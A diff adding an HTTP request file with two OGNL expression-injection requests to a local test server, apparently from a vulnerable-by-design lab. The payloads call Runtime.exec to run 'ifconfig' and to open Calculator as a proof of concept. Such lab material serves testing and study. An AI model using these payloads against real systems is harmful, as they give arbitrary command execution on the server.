@@ -1,0 +1,17 @@
+###
+# ibatis get
+POST /expression/OGNL/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+{(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())).useDelimiter("\\A").next()}
+
+
+###
+# ibatis set
+POST /expression/OGNL/case4 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app'))(a)(b)
+
